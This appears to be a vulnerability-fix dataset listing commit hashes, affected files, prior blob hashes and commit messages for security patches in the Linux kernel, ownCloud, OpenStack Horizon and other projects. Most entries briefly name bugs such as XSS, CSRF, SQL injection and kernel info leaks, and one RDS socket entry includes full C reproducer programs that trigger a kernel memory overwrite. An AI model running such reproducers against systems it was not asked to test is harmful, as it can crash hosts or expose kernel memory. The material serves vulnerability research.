    deecc7294a672c3fa64cf3884c4ee28f4c7f80a7
    e5b68f2e0ac796c514885b2f57cb386209ae657a
    ea54cdef04ddc94d282c22f8c2b721169ee77293
    ea83f81f9f2365e57287569df3a8aaf61061e87d
    f3a2bb962f5d50dbbaeac70936b76cdd34ec80f5
    f9cfd168fbe2d4d408800e964268a8d40a3ec9ac
    fc47a2b384eab3f4ab3cd5d958c80f1dece80cfd
    fe047d966dc5d9af1430dbb7596a511ce57131cb
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 13d518074a952d33d47c428419693f63389547e9:
epoll: clear the tfile_check_list on -ELOOP\n\nAn epoll_ctl(,EPOLL_CTL_ADD,,) operation can return '-ELOOP' to prevent circular epoll dependencies from being created.  However, in that case we do not properly clear the 'tfile_check_list'.  Thus, add a call to clear_tfile_check_list() for the -ELOOP case.\n\nSigned-off-by: Jason Baron <jbaron@redhat.com> Reported-by: Yurij M. Plotnikov <Yurij.Plotnikov@oktetlabs.ru> Cc: Nelson Elhage <nelhage@nelhage.com> Cc: Davide Libenzi <davidel@xmailserver.org> Tested-by: Alexandra N. Kossovsky <Alexandra.Kossovsky@oktetlabs.ru> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    d16d4623edb210635bec3ca3786481b82cde25a2
File(s) In Commit: 
    mcs/class/System.Web/System.Web/HttpForbiddenHandler.cs
Blob(s) In Commit: 
    7e87d487a607a0b942f32830e5ab7011425700f3
Blob(s) Before Fix: 
    af5ddf45a7a1a3c2d7a867a5aa9ef879491059fe
Projects:
    0-T-0_ps4-linux
    004307ec_mono
Commit Message for d16d4623edb210635bec3ca3786481b82cde25a2:
HtmlEncode the path\n\n	Fixes Novell bug #769799.

======================================================================
Commit With Fix: 
    06b6a1cf6e776426766298d055bb3991957d90a7
File(s) In Commit: 
    net/rds/recv.c
Blob(s) In Commit: 
    9f0f17cf6bf9b16e95c7a89d1bc452a0e4c0aada
Blob(s) Before Fix: 
    00896faca05b0367657ed5785a9e8c9f8484404f
    143e105bc403349f5a8d5a11e0d43937041b7b3c
    51a8f8ea6c6f0d923a37fb33d5ac580aa0acf4f6
    596689e592727f93eaf749490cf6fb6af4956463
    5c6e9f1320266cf175ed55ea69e3a7c28437ce1b
    6a2654ad3628cfa103f80c40735abd8cb0782f6c
    6d56314e13500d02a7c4cf3093394fcbac342dce
    795a00b7f2cb7aa6a539adb3c86a2cad180575f1
    bc3f8cd6d07063689b37f3fe32e790fc9195a7e9
    bd82522534fc52f1705c7833d1b443c4ca695398
    de339b24ca140f5322a4c6d167450449f3f81bdc
    e868c0e6696d187300089f8294be12178825999a
    fc57d31676a13b0e1de6d9d7df5606755574d12d
    fdff33c7b432448b43d31ce76fc3fd224156f9ab
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 06b6a1cf6e776426766298d055bb3991957d90a7:
rds: set correct msg_namelen\n\nJay Fenlason (fenlason@redhat.com) found a bug, that recvfrom() on an RDS socket can return the contents of random kernel memory to userspace if it was called with a address length larger than sizeof(struct sockaddr_in). rds_recvmsg() also fails to set the addr_len paramater properly before returning, but that's just a bug. There are also a number of cases wher recvfrom() can return an entirely bogus address. Anything in rds_recvmsg() that returns a non-negative value but does not go through the "sin = (struct sockaddr_in *)msg->msg_name " code path at the end of the while(1) loop will return up to 128 bytes of kernel memory to userspace.\n\nAnd I write two test programs to reproduce this bug, you will see that in rds_server, fromAddr will be overwritten and the following sock_fd will be destroyed. Yes, it is the programmer's fault to set msg_namelen incorrectly, but it is better to make the kernel copy the real length of address to user space in such case.\n\nHow to run the test programs ? I test them on 32bit x86 system, 3.5.0-rc7.\n\n1 compile gcc -o rds_client rds_client.c gcc -o rds_server rds_server.c\n\n2 run ./rds_server on one console\n\n3 run ./rds_client on another console\n\n4 you will see something like: server is waiting to receive data... old socket fd=3 server received data from client:data from client msg.msg_namelen=32 new socket fd=-1067277685 sendmsg() : Bad file descriptor\n\n/***************** rds_client.c ********************/\n\nint main(void) { 	int sock_fd  	struct sockaddr_in serverAddr  	struct sockaddr_in toAddr  	char recvBuffer[128] = "data from client"  	struct msghdr msg  	struct iovec iov \n\n	sock_fd = socket(AF_RDS, SOCK_SEQPACKET, 0)  	if (sock_fd < 0) { 		perror("create socket error\n")  		exit(1)  	}\n\n	memset(&serverAddr, 0, sizeof(serverAddr))  	serverAddr.sin_family = AF_INET  	serverAddr.sin_addr.s_addr = inet_addr("127.0.0.1")  	serverAddr.sin_port = htons(4001) \n\n	if (bind(sock_fd, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) { 		perror("bind() error\n")  		close(sock_fd)  		exit(1)  	}\n\n	memset(&toAddr, 0, sizeof(toAddr))  	toAddr.sin_family = AF_INET  	toAddr.sin_addr.s_addr = inet_addr("127.0.0.1")  	toAddr.sin_port = htons(4000)  	msg.msg_name = &toAddr  	msg.msg_namelen = sizeof(toAddr)  	msg.msg_iov = &iov  	msg.msg_iovlen = 1  	msg.msg_iov->iov_base = recvBuffer  	msg.msg_iov->iov_len = strlen(recvBuffer) + 1  	msg.msg_control = 0  	msg.msg_controllen = 0  	msg.msg_flags = 0 \n\n	if (sendmsg(sock_fd, &msg, 0) == -1) { 		perror("sendto() error\n")  		close(sock_fd)  		exit(1)  	}\n\n	printf("client send data:%s\n", recvBuffer) \n\n	memset(recvBuffer, '\0', 128) \n\n	msg.msg_name = &toAddr  	msg.msg_namelen = sizeof(toAddr)  	msg.msg_iov = &iov  	msg.msg_iovlen = 1  	msg.msg_iov->iov_base = recvBuffer  	msg.msg_iov->iov_len = 128  	msg.msg_control = 0  	msg.msg_controllen = 0  	msg.msg_flags = 0  	if (recvmsg(sock_fd, &msg, 0) == -1) { 		perror("recvmsg() error\n")  		close(sock_fd)  		exit(1)  	}\n\n	printf("receive data from server:%s\n", recvBuffer) \n\n	close(sock_fd) \n\n	return 0  }\n\n/***************** rds_server.c ********************/\n\nint main(void) { 	struct sockaddr_in fromAddr  	int sock_fd  	struct sockaddr_in serverAddr  	unsigned int addrLen  	char recvBuffer[128]  	struct msghdr msg  	struct iovec iov \n\n	sock_fd = socket(AF_RDS, SOCK_SEQPACKET, 0)  	if(sock_fd < 0) { 		perror("create socket error\n")  		exit(0)  	}\n\n	memset(&serverAddr, 0, sizeof(serverAddr))  	serverAddr.sin_family = AF_INET  	serverAddr.sin_addr.s_addr = inet_addr("127.0.0.1")  	serverAddr.sin_port = htons(4000)  	if (bind(sock_fd, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) { 		perror("bind error\n")  		close(sock_fd)  		exit(1)  	}\n\n	printf("server is waiting to receive data...\n")  	msg.msg_name = &fromAddr \n\n	/* 	 * I add 16 to sizeof(fromAddr), ie 32, 	 * and pay attention to the definition of fromAddr, 	 * recvmsg() will overwrite sock_fd, 	 * since kernel will copy 32 bytes to userspace. 	 * 	 * If you just use sizeof(fromAddr), it works fine. 	 * */ 	msg.msg_namelen = sizeof(fromAddr) + 16  	/* msg.msg_namelen = sizeof(fromAddr)  */ 	msg.msg_iov = &iov  	msg.msg_iovlen = 1  	msg.msg_iov->iov_base = recvBuffer  	msg.msg_iov->iov_len = 128  	msg.msg_control = 0  	msg.msg_controllen = 0  	msg.msg_flags = 0 \n\n	while (1) { 		printf("old socket fd=%d\n", sock_fd)  		if (recvmsg(sock_fd, &msg, 0) == -1) { 			perror("recvmsg() error\n")  			close(sock_fd)  			exit(1)  		} 		printf("server received data from client:%s\n", recvBuffer)  		printf("msg.msg_namelen=%d\n", msg.msg_namelen)  		printf("new socket fd=%d\n", sock_fd)  		strcat(recvBuffer, "--data from server")  		if (sendmsg(sock_fd, &msg, 0) == -1) { 			perror("sendmsg()\n")  			close(sock_fd)  			exit(1)  		} 	}\n\n	close(sock_fd)  	return 0  }\n\nSigned-off-by: Weiping Pan <wpan@redhat.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    91becae76101cf87ce8cbfabe3af2622fc328fe5
File(s) In Commit: 
    beaker/crypto/pycrypto.py
Blob(s) In Commit: 
    ed42dbe706f43ac6b6c810b646af371df7ada970
Blob(s) Before Fix: 
    1939555ce4cfc18c15c7da8eb14c1903970680d5
Projects:
    C-Pro_beaker
Commit Message for 91becae76101cf87ce8cbfabe3af2622fc328fe5:
Apply patch from Redhat to secure pycrypto that otherwise could allow an attacker to determine contents of the encrypted payload (but is unable to modify).

======================================================================
Commit With Fix: 
    80f74451f628264d1d9a1f1c0bbcebc932ba5e00
File(s) In Commit: 
    src/squidclamav.c
Blob(s) In Commit: 
    44e614ee76e421a75565c0f938d88922c70d9afa
Blob(s) Before Fix: 
    7aa63a73dd21dceeed7dbbc98d782e9c041be9e1
Projects:
    AgNO3_squidclamav
Commit Message for 80f74451f628264d1d9a1f1c0bbcebc932ba5e00:
Add a workaround for a squidGuard bug that unescape the URL and send it back unescaped. This could conduct in wrong result and ssquidclamav crash especially with URL containing the %0D or %0A character. John Xue

======================================================================
Commit With Fix: 
    f0ec1aaf54caddd21c259aea8b2ecfbde4ee4fb9
File(s) In Commit: 
    kernel/tsacct.c
Blob(s) In Commit: 
    96f77013d3f038ea03b688c448e2ef69a77aee06
Blob(s) Before Fix: 
    65a5036a3d9519031526f499c5495ac23401a90e
    db443221ba5ba0038ee3bd40270f6b5a2a8922b7
Projects:
    0-T-0_ps4-linux
    007shadowfighter_rails
    0day-ci_xen
Commit Message for f0ec1aaf54caddd21c259aea8b2ecfbde4ee4fb9:
[PATCH] xacct_add_tsk: fix pure theoretical ->mm use-after-free\n\nParanoid fix. The task can free its ->mm after the 'if (p->mm)' check.\n\nSigned-off-by: Oleg Nesterov <oleg@tv-sign.ru> Cc: Shailabh Nagar <nagar@watson.ibm.com> Cc: Balbir Singh <balbir@in.ibm.com> Cc: Jay Lan <jlan@sgi.com> Signed-off-by: Andrew Morton <akpm@osdl.org> Signed-off-by: Linus Torvalds <torvalds@osdl.org>

======================================================================
Commit With Fix: 
    9ab4233dd08036fe34a89c7dc6f47a8bf2eb29eb
File(s) In Commit: 
    mm/madvise.c
Blob(s) In Commit: 
    14d260fa0d17939a2279c244df91789cd30720e4
Blob(s) Before Fix: 
    03dfa5c7adb3c41acdf672b6504516073866c996
    1a58ddfb53a07ba7df78ded30bebe7fa46693671
    1ccbba5b667414e717db987b85da9e0f1691268f
    2221491ed5038dcdcbe3c19bc65172eeb4380a75
    319528b8db74c8d0c7cd10c8468acb5539aea7dd
    55f645c85a35a3444d3721f2bde21acbc367b9c5
    74bf193eff04fdeea6c433675a3705adbeb3c0f1
    b2a80fdecd39698d30f9a853c6a25c01aa543e6d
    c07139e527fda114133bad36c7d0e639f2d12eb0
    deabe5f603adb7f94758eb035d6e19fe7a15a6f2
    deff1b64a08c36ef4857590e9913717488953014
    e405c5f277934770b8aab8ddc88aed608c83f9ba
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 9ab4233dd08036fe34a89c7dc6f47a8bf2eb29eb:
mm: Hold a file reference in madvise_remove\n\nOtherwise the code races with munmap (causing a use-after-free of the vma) or with close (causing a use-after-free of the struct file).\n\nThe bug was introduced by commit 90ed52ebe481 ("[PATCH] holepunch: fix mmap_sem i_mutex deadlock")\n\nCc: Hugh Dickins <hugh@veritas.com> Cc: Miklos Szeredi <mszeredi@suse.cz> Cc: Badari Pulavarty <pbadari@us.ibm.com> Cc: Nick Piggin <npiggin@suse.de> Cc: stable@vger.kernel.org Signed-off-by: Andy Lutomirski <luto@amacapital.net> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    aabcffae560d5fd00cd1d2ffce5d760353cf0a4d
File(s) In Commit: 
    s2s/out.c
Blob(s) In Commit: 
    7b9f44ff27b6abf2609b86f2f55abff090c69749
Blob(s) Before Fix: 
    0ed9b3011d21e09a5800ac003e802a36110b33d1
    87bad620be40b59ade86d264fdf237ff75ec98b9
Projects:
    20150723_jabberd2
Commit Message for aabcffae560d5fd00cd1d2ffce5d760353cf0a4d:
Fixed possibility of Unsolicited Dialback Attacks

======================================================================
Commit With Fix: 
    35eada8a27323c0f83c400177797927aba6bc99b
File(s) In Commit: 
    horizon/views/auth_forms.py
Blob(s) In Commit: 
    abf08803329c8281c98f492f45181f957ea9af5c
Blob(s) Before Fix: 
    2ebecfcdadc813ba11bbd5061959e2d8254161ec
Projects:
    1149608162_devstack
Commit Message for 35eada8a27323c0f83c400177797927aba6bc99b:
Fix open redirect in Horizon.\n\nLP 1039077. Disallow login redirects to anywhere other than the same origin.\n\nChange-Id: I36e8e4f30cf440ecc73534af38fcd8d2a111a603

======================================================================
Commit With Fix: 
    fd44bf5e6d0d360f6a493d663b653c121fa83c3f
File(s) In Commit: 
    lib/puppet/defaults.rb
Blob(s) In Commit: 
    56223bb5307a7fa3e3ac5184f718c1cca14f6335
Blob(s) Before Fix: 
    1090d2e6b94e12481f4a1603750888a44e217391
    9fe2fa715951db63a7bdf95d8c58b8d72a90ac4b
    dc820f061b0d8dc179109cdbc45506e9e4ac3d4e
Projects:
    00gh_ansible
    08_puppet
Commit Message for fd44bf5e6d0d360f6a493d663b653c121fa83c3f:
Tighten permissions on classfile, resourcefile, lastrunfile, and lastrunreport.

======================================================================
Commit With Fix: 
    4fd069b47906ebcf83887970c732d464dbe7d37a
File(s) In Commit: 
    lib/migrate.php
Blob(s) In Commit: 
    d05c781f5556974b4a4238c566822b52ea52987f
Blob(s) Before Fix: 
    5939ba32e50d76ba10827506059e381b5b090ef0
Projects:
    001101_server
Commit Message for 4fd069b47906ebcf83887970c732d464dbe7d37a:
Also check some other files

======================================================================
Commit With Fix: 
    5192eecce239a0b7ade1e60a6cf03075e5cfc188
File(s) In Commit: 
    core/ajax/appconfig.php
Blob(s) In Commit: 
    bf749be3e30db95dadabc419f663974f6300cae9
Blob(s) Before Fix: 
    84e0710c74a5c36b40e73d240221f4cd880befd1
    f815d710631f81a1ccf6a50acf391f77cc13b199
Projects:
    001101_server
Commit Message for 5192eecce239a0b7ade1e60a6cf03075e5cfc188:
Added XSRF check

======================================================================
Commit With Fix: 
    4fd069b47906ebcf83887970c732d464dbe7d37a
File(s) In Commit: 
    lib/migrate.php
Blob(s) In Commit: 
    d05c781f5556974b4a4238c566822b52ea52987f
Blob(s) Before Fix: 
    5939ba32e50d76ba10827506059e381b5b090ef0
Projects:
    001101_server
Commit Message for 4fd069b47906ebcf83887970c732d464dbe7d37a:
Also check some other files

======================================================================
Commit With Fix: 
    d203fa2c50f4b2791e68e2b8ab9a0f8b94f9c9f8
File(s) In Commit: 
    apps/files/js/filelist.js
Blob(s) In Commit: 
    3645258f98f0ae3a43211369a90477b4439e84f1
Blob(s) Before Fix: 
    31fb5f892e44424f95135ef7e4b3de5b7d74b06f
    e6a9a6883af8e7bec9d0f3bcb2b9b48ddb5fbcf0
Projects:
    001101_server
Commit Message for d203fa2c50f4b2791e68e2b8ab9a0f8b94f9c9f8:
Sanitizing file names

======================================================================
Commit With Fix: 
    0074062b5329c3d43679909fddce2d70608a4475
File(s) In Commit: 
    index.php
Blob(s) In Commit: 
    4df62327c47a0a11f0f38d3022c45d0e0cefea4b
Blob(s) Before Fix: 
    5042ede2e27e324082db62a57b00481383e00754
Projects:
    001101_server
Commit Message for 0074062b5329c3d43679909fddce2d70608a4475:
fixed xss vulnerability

======================================================================
Commit With Fix: 
    70789d7052239992824628db8133de08dc78e593
File(s) In Commit: 
    net/ipv6/reassembly.c
Blob(s) In Commit: 
    64cfef1b0a4c556ccf63c2f912c86ec3a1599b82
Blob(s) Before Fix: 
    07beeb06f752da7cae16fb442d9d060624668275
    0f276645375969054b36aea6c8fcb7a80666921c
    2cddea3bd6be9fcb935669ec26678e3b0c368b2e
    4beb861ca6766bf66e7cd35b28efa357b2400402
    545c4141b755ee91277c6bd2912de4f42813bb05
    59e7c631787279bef822efccb9ea4e51813bcc6e
    6d4292ff585463178885153cdd2fe6e044b962a9
    9f6a13f5d566f86a81d8b3f4a319c8b3cc81284c
    d873745ca744ef5671d4bdebe5bb284e64464201
    da5bd0ed83df251a4a5340f382fc1639c2fa9a72
    e9ac7a12f5951f58f1c211b7e064c8dfcf43cf53
    eb48a8860125a110fb3bf4647a5811b1524d308a
Projects:
    0-T-0_ps4-linux
    007shadowfighter_rails
    0day-ci_xen
Commit Message for 70789d7052239992824628db8133de08dc78e593:
ipv6: discard overlapping fragment\n\nRFC5722 prohibits reassembling fragments when some data overlaps.\n\nBug spotted by Zhang Zuotao <zuotao.zhang@6wind.com>.\n\nSigned-off-by: Nicolas Dichtel <nicolas.dichtel@6wind.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    ed6fe9d614fc1bca95eb8c0ccd0e92db00ef9d5d
File(s) In Commit: 
    net/socket.c
Blob(s) In Commit: 
    edc3c4af9085362c7227e31babfc19a489bf9cf6
Blob(s) Before Fix: 
    02dc82db3d232c79173d271370f7ff2bd68f5dc7
    0452dca4cd24d7e97923fa28cf8095453a1b71bc
    06ffa0f28398b288ccdbbe976eff8e32777f97cb
    2877647f347b06e75aaaa7fd355799a43cd65bf3
    28a96af484b421ee06fffbe87358c1811693c97f
    3ca2fd9e37200e3e12f6606065acb8c982f25528
    4b4e4a8cf3ad60084a01766fef7dea67c4ebc7a6
    6e0ccc09b3131112bce0970ca91d5032545b3772
    851edcd6b0982d5a820da29e2145be75bddcff9c
    a5471f804d994ece8c31df6be0e04d5076b6dfd0
    a990aa97f257e9641249a326e18f66f84f9552c4
    d449812d6208d337d0d927d47401ca62346632ea
    d92c490e66fa84e432f11086642c091f5831da65
    dfe5b66c97e0bc836efed43ad080dec620301306
    e56162cd65b053b7a86119737dd7ca91329573d7
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for ed6fe9d614fc1bca95eb8c0ccd0e92db00ef9d5d:
Fix order of arguments to compat_put_time[spec|val]\n\nCommit 644595f89620 ("compat: Handle COMPAT_USE_64BIT_TIME in net/socket.c") introduced a bug where the helper functions to take either a 64-bit or compat time[spec|val] got the arguments in the wrong order, passing the kernel stack pointer off as a user pointer (and vice versa).\n\nBecause of the user address range check, that in turn then causes an EFAULT due to the user pointer range checking failing for the kernel address.  Incorrectly resuling in a failed system call for 32-bit processes with a 64-bit kernel.\n\nOn odder architectures like HP-PA (with separate user/kernel address spaces), it can be used read kernel memory.\n\nSigned-off-by: Mikulas Patocka <mpatocka@redhat.com> Cc: stable@vger.kernel.org Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    dee1f973ca341c266229faa5a1a5bb268bed3531
File(s) In Commit: 
    fs/ext4/extents.c
Blob(s) In Commit: 
    7011ac967208e941272f09a07e3292d72ef576f9
Blob(s) Before Fix: 
    1c94cca35ed1a12ce42ce39bddea7c9dd23111cf
    607b1557d292d1b24d5a605d28565de17f36bf13
    741bb944f97b330237dacdc22901294467023443
    74f23c292e1b3000bb7bd9cf0e953df27488b698
    91341ec6e06a94f2f400d10039a64585cd17ed2e
    9752106662d1c82a5a787308ecb940860e2916a3
    aabbb3f53683f54081cd04c9a6d150e0121cc640
    abcdeab67f5232b66d4aa5a6cbb88838094f6247
    c2789271e7b4ee5c2eecff2291b4b2f5fbf4eacc
    cd0c7ed0677200d09ce1445def04452a2f178978
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for dee1f973ca341c266229faa5a1a5bb268bed3531:
ext4: race-condition protection for ext4_convert_unwritten_extents_endio\n\nWe assumed that at the time we call ext4_convert_unwritten_extents_endio() extent in question is fully inside [map.m_lblk, map->m_len] because it was already split during submission.  But this may not be true due to a race between writeback vs fallocate.\n\nIf extent in question is larger than requested we will split it again. Special precautions should being done if zeroout required because [map.m_lblk, map->m_len] already contains valid data.\n\nSigned-off-by: Dmitry Monakhov <dmonakhov@openvz.org> Signed-off-by: "Theodore Ts'o" <tytso@mit.edu> Cc: stable@vger.kernel.org

======================================================================
Commit With Fix: 
    8f363b77ee4fbf7c3bbcf5ec2c5ca482d396d664
File(s) In Commit: 
    net/ipv4/tcp_illinois.c
Blob(s) In Commit: 
    834857f3c8713e8d8b80ab7b4f413725ec0ca9b4
Blob(s) Before Fix: 
    00ca688d89644b5c9456db8839a8ff36b7e562a3
    1d5a30a90adf6194d3b2d2215276f52c0a3f4632
    1eba160b72dc452b70ddbbfaa374de51ce938f0d
    2d799b101aece4a64454182e5bef8179f5bdeede
    5999b3972e6449d616facb628d27116ab8876ac2
    71135e33af1f0449f54838a20a516f78356a252e
    813b43a76fece71e2614878a5830962d55f35a22
    86183c4e4fd54a231933e09bd3d0b62c8228699e
    8a520996f3d268b6a3a1407fce986c3cf781a871
    8dc03ec75829c0bf9d4a9991e1c081a41b374f36
    b2b2256d3b8450c944bc8d3a8869a76aaf2ceb69
    c35d91f0fb11622308c24fa3a51f497e47a25ef4
    e498a62b8f972d29126f24569c2dbc85037b80a7
    e6d483105f8085df1e776d2b43f812330f7258d0
    efa184f086f488992ded17333b6dda724bca6baa
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 8f363b77ee4fbf7c3bbcf5ec2c5ca482d396d664:
net: fix divide by zero in tcp algorithm illinois\n\nReading TCP stats when using TCP Illinois congestion control algorithm can cause a divide by zero kernel oops.\n\nThe division by zero occur in tcp_illinois_info() at:  do_div(t, ca->cnt_rtt)  where ca->cnt_rtt can become zero (when rtt_reset is called)\n\nSteps to Reproduce:  1. Register tcp_illinois:      # sysctl -w net.ipv4.tcp_congestion_control=illinois  2. Monitor internal TCP information via command "ss -i"      # watch -d ss -i  3. Establish new TCP conn to machine\n\nEither it fails at the initial conn, or else it needs to wait for a loss or a reset.\n\nThis is only related to reading stats.  The function avg_delay() also performs the same divide, but is guarded with a (ca->cnt_rtt > 0) at its calling point in update_params().  Thus, simply fix tcp_illinois_info().\n\nFunction tcp_illinois_info() / get_info() is called without socket lock.  Thus, eliminate any race condition on ca->cnt_rtt by using a local stack variable.  Simply reuse info.tcpv_rttcnt, as its already set to ca->cnt_rtt. Function avg_delay() is not affected by this race condition, as its called with the socket lock.\n\nCc: Petr Matousek <pmatouse@redhat.com> Signed-off-by: Jesper Dangaard Brouer <brouer@redhat.com> Acked-by: Eric Dumazet <edumazet@google.com> Acked-by: Stephen Hemminger <shemminger@vyatta.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    501a9d5d261c718913cfc13d212b09b56f3bf087
File(s) In Commit: 
    public/application/controllers/invoice.php
Blob(s) In Commit: 
    3d9590890b22067605edb178714648b4ff389f13
Blob(s) Before Fix: 
    387bea888530fd0a060ebce4936424e1d0048e56
Projects:
    LjC_neoinvoice
Commit Message for 501a9d5d261c718913cfc13d212b09b56f3bf087:
Remove invalid characters in list_items() to prevent SQL-injections. Fixes #2.

======================================================================
Commit With Fix: 
    9605e1926c6081e88326bf78a02c1d1b83126c4f
File(s) In Commit: 
    core/ajax/appconfig.php
Blob(s) In Commit: 
    de91d458ed153286ee1828d7ca5e877728d35214
Blob(s) Before Fix: 
    f815d710631f81a1ccf6a50acf391f77cc13b199
Projects:
    001101_server
Commit Message for 9605e1926c6081e88326bf78a02c1d1b83126c4f:
Check for admin user

======================================================================
Commit With Fix: 
    08dff7b7d629807dbb1f398c68dd9cd58dd657a1
File(s) In Commit: 
    mm/memory_hotplug.c
Blob(s) In Commit: 
    597d371329d390267e1ad194e7979bc79466cf0b
Blob(s) Before Fix: 
    b8731040b9f9292f566f50d9f59b1112f87f104c
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 08dff7b7d629807dbb1f398c68dd9cd58dd657a1:
mm/hotplug: correctly add new zone to all other nodes' zone lists\n\nWhen online_pages() is called to add new memory to an empty zone, it rebuilds all zone lists by calling build_all_zonelists().  But there's a bug which prevents the new zone to be added to other nodes' zone lists.\n\nonline_pages() { 	build_all_zonelists() 	..... 	node_set_state(zone_to_nid(zone), N_HIGH_MEMORY) }\n\nHere the node of the zone is put into N_HIGH_MEMORY state after calling build_all_zonelists(), but build_all_zonelists() only adds zones from nodes in N_HIGH_MEMORY state to the fallback zone lists. build_all_zonelists()\n\n    ->__build_all_zonelists() 	->build_zonelists() 	    ->find_next_best_node() 		->for_each_node_state(n, N_HIGH_MEMORY)\n\nSo memory in the new zone will never be used by other nodes, and it may cause strange behavor when system is under memory pressure.  So put node into N_HIGH_MEMORY state before calling build_all_zonelists().\n\nSigned-off-by: Jianguo Wu <wujianguo@huawei.com> Signed-off-by: Jiang Liu <liuj97@gmail.com> Cc: Mel Gorman <mgorman@suse.de> Cc: Michal Hocko <mhocko@suse.cz> Cc: Minchan Kim <minchan@kernel.org> Cc: Rusty Russell <rusty@rustcorp.com.au> Cc: Yinghai Lu <yinghai@kernel.org> Cc: Tony Luck <tony.luck@intel.com> Cc: KAMEZAWA Hiroyuki <kamezawa.hiroyu@jp.fujitsu.com> Cc: KOSAKI Motohiro <kosaki.motohiro@jp.fujitsu.com> Cc: David Rientjes <rientjes@google.com> Cc: Keping Chen <chenkeping@huawei.com> Signed-off-by: Andrew Morton <akpm@linux-foundation.org> Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

======================================================================
Commit With Fix: 
    95a69adab9acfc3981c504737a2b6578e4d846ef
File(s) In Commit: 
    tools/hv/hv_kvp_daemon.c
Blob(s) In Commit: 
    c1d910243d49abe6012595d50227648873994ed8
Blob(s) Before Fix: 
    13c2a142331defeb539e40b9fe4d942f66c3aa4a
    6fe6f3a68b940b7d588da71e79e6a90835871f75
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 95a69adab9acfc3981c504737a2b6578e4d846ef:
tools: hv: Netlink source address validation allows DoS\n\nThe source code without this patch caused hypervkvpd to exit when it processed a spoofed Netlink packet which has been sent from an untrusted local user. Now Netlink messages with a non-zero nl_pid source address are ignored and a warning is printed into the syslog.\n\nSigned-off-by: Tomas Hozza <thozza@redhat.com> Acked-by:  K. Y. Srinivasan <kys@microsoft.com> Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

======================================================================
Commit With Fix: 
    1ad0d1d792395306b59a34ad7b6e7e89a35d041e
File(s) In Commit: 
    openshift-console/app/controllers/application_controller.rb
Blob(s) In Commit: 
    e170f1ad2a8a7d99e4c188273229c43395fba25d
Blob(s) Before Fix: 
    311a8750cd7171423d7ae27b3d4dc47ef1b1ac2a
    e8065d9505d7ec6f727021c827de18a0a95737de
Projects:
    2014cdag21_origin-server
Commit Message for 1ad0d1d792395306b59a34ad7b6e7e89a35d041e:
BZ878754 No CSRF attack protection in console

======================================================================
Commit With Fix: 
    32564a0839b1517d762afab2013c26c0959bac00
File(s) In Commit: 
    node-util/www/html/restorer.php
Blob(s) In Commit: 
    b1f66a947c0d848c0a0db3eaf4dbd3a325e447d1
Blob(s) Before Fix: 
    49694dcac3c0fa515035eb3ce288bbfbe89951be
Projects:
    2014cdag21_origin-server
Commit Message for 32564a0839b1517d762afab2013c26c0959bac00:
Fix for Bug 880699\n\nrestorer.php security patch

======================================================================
Commit With Fix: 
    32564a0839b1517d762afab2013c26c0959bac00
File(s) In Commit: 
    node-util/www/html/restorer.php
Blob(s) In Commit: 
    b1f66a947c0d848c0a0db3eaf4dbd3a325e447d1
Blob(s) Before Fix: 
    49694dcac3c0fa515035eb3ce288bbfbe89951be
Projects:
    2014cdag21_origin-server
Commit Message for 32564a0839b1517d762afab2013c26c0959bac00:
Fix for Bug 880699\n\nrestorer.php security patch

======================================================================
Commit With Fix: 
    ac0707aa61d9c20e9b09062294701567c9f41595
File(s) In Commit: 
    modules/m_capab.c
Blob(s) In Commit: 
    b03fb3fd13a88f2e57762d007ad2dbe11a0e9791
Blob(s) Before Fix: 
    227a9972f4e6b5109644338e3b2437e0281d56c3
    54e9a53f72e7f121511db16cb37185b8460934bc
    ffd772bd7822452ca4dc168fc5fb19ac2c50eb1e
Projects:
    0re5ama_ircd-seven
Commit Message for ac0707aa61d9c20e9b09062294701567c9f41595:
m_capab: fix a possible remote crash triggered by the CAPAB parsing code.

======================================================================
Commit With Fix: 
    65f1e42b7bda0f3410931c50598540d944d8bf0d
File(s) In Commit: 
    katello-configure/modules/certs/manifests/config.pp
Blob(s) In Commit: 
    dce2b8991a364dc062c4ca26b7c9aa431a7b5dcc
Blob(s) Before Fix: 
    b9a6807628ead0cd897ef4493aaf6287951f18b2
Projects:
    ATIX-AG_katello
Commit Message for 65f1e42b7bda0f3410931c50598540d944d8bf0d:
877387 - Candlepin CA certificate mode in RPM\n\nFile mode is set to 0644 when RPM is generated.

======================================================================
Commit With Fix: 
    4c87308bdea31a7b4828a51f6156e6f721a1fcc9
File(s) In Commit: 
    net/xfrm/xfrm_user.c
Blob(s) In Commit: 
    40dd50d6c4cc31efec38b9525f88056269df9a4a
Blob(s) Before Fix: 
    d12b62547ad072778e11fb934f0dae719f156f2b
Projects:
    0-T-0_ps4-linux
    0day-ci_xen
Commit Message for 4c87308bdea31a7b4828a51f6156e6f721a1fcc9:
xfrm_user: fix info leak in copy_to_user_auth()\n\ncopy_to_user_auth() fails to initialize the remainder of alg_name and therefore discloses up to 54 bytes of heap memory via netlink to userland.\n\nUse strncpy() instead of strcpy() to fill the trailing bytes of alg_name with null bytes.\n\nSigned-off-by: Mathias Krause <minipli@googlemail.com> Acked-by: Steffen Klassert <steffen.klassert@secunet.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    43da5f2e0d0c69ded3d51907d9552310a6b545e8
File(s) In Commit: 
    net/socket.c
Blob(s) In Commit: 
